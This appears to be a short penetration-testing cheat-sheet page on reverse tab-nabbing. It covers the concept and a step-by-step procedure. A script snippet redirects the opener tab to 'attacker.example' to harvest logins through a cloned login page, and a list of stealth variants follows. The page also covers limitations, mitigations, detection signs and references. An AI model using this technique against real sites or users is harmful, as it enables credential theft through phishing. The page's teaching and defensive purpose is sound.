---
topic: Reverse tab-nabbing — hijacking the original tab
tags: [web, tabnabbing, target-blank, noopener, phishing]
---

# Reverse tab-nabbing — hijacking the original tab

**English** | [🌐 Español](reverse-tabnabbing.md)

## Concept

A link with `target="_blank"` and no `rel="noopener"` gives the opened page access to `window.opener`. That page can change the original tab's location and show a fake login to capture credentials.

## When it applies

- A privileged user reviews links submitted by others.
- The link opens in a new tab without `noopener`.
- The session lives in the original tab.

## Procedure

1. Publish a link to a controlled page.
2. Redirect `window.opener.location` to a cloned login.
3. Log the username and password POST.
4. Use the credentials on the real panel.

## Commands

```bash
<script>
window.opener.location = 'https://attacker.example/login';
</script>
<!-- the fake login posts to the attacker and redirects to the real site -->
```

## Variants

- Change the form through `window.opener.document`.
- Delay the redirect so the user does not notice.
- Combine with a visual clone of the panel.

## Limitations

- Modern browsers imply `noopener` in many cases.
- The victim must return to the original tab and type.
- A strict referrer policy may alert.

## Mitigation

- Add `rel="noopener noreferrer"` to external links.
- Open user links on an isolated domain.
- Reauthenticate sensitive actions.

## Detection

- User links opening new tabs.
- Original-tab redirects after link review.
- Logins from unexpected locations.

## References

- [0xdf — Developer](https://0xdf.gitlab.io/2022/01/15/htb-developer.html)
- [OWASP — Reverse tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
- [MDN — rel=noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener)
